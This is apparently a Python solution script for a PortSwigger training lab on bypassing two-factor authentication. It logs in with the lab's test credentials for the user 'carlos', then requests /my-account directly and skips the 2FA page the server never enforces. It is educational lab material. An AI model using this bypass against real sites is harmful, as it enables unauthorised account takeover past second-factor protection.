# Lab 02 — 2FA simple bypass
# PortSwigger: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
#
# Vulnerability: After step 1 (credentials), the 2FA prompt is just a page
#                the app redirects you to — but accessing /my-account directly
#                skips it entirely because step 2 is never server-enforced
# Aim:           Log in as carlos without his 2FA code
#
# Technique:
#   Submit carlos's credentials → server accepts them, issues a partial session,
#   redirects to /login2 for 2FA. Instead of following to /login2, navigate
#   directly to /my-account?id=carlos — the server never checked that 2FA
#   was completed.
#
# Usage: python authentication_lab02.py <url>

import sys
import urllib3
from proxies import proxies
from authentication_utils import banner, section, make_session, get_csrf_from_response, check_status

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CARLOS_USERNAME = "carlos"
CARLOS_PASSWORD = "montoya"

if __name__ == "__main__":
    banner()
    section("LAB 02 — 2FA SIMPLE BYPASS")

    if len(sys.argv) != 2:
        print("  Usage: python authentication_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: submit carlos's credentials ─────────────────────────────────
    print("\n  ── Step 1: submit carlos's credentials (expect redirect to /login2)\n")
    login_page = session.get(f"{url}/login")
    csrf = get_csrf_from_response(login_page.text)

    data = {"username": CARLOS_USERNAME, "password": CARLOS_PASSWORD}
    if csrf:
        data["csrf"] = csrf

    r = session.post(f"{url}/login", data=data, allow_redirects=False)
    print(f"  ℹ  POST /login status: {r.status_code}")
    print(f"  ℹ  Location: {r.headers.get('Location', '(none)')}")

    if r.status_code not in (302, 303):
        print("  ✘  Login step 1 failed — credentials may be wrong")
        sys.exit(1)

    print("  ✔  Credentials accepted — session now has a partial (pre-2FA) authentication\n")

    # ── Step 2: skip /login2 entirely, go straight to /my-account ───────────
    print("  ── Step 2: navigate directly to /my-account?id=carlos (skip 2FA)\n")
    r2 = session.get(f"{url}/my-account", params={"id": CARLOS_USERNAME})
    check_status(r2, 200, "GET /my-account?id=carlos (bypassing 2FA)")

    if CARLOS_USERNAME in r2.text or "Log out" in r2.text:
        print(f"\n  ✔  2FA bypassed — authenticated as {CARLOS_USERNAME}")
    else:
        print("\n  ?  Page loaded but may not be carlos's account — inspect manually")

    print()
    print(f"  ℹ  The server issued a session after step 1 (credentials) and")
    print(f"     redirected to /login2. But it never verified that /login2")
    print(f"     was actually completed before allowing access to /my-account.")
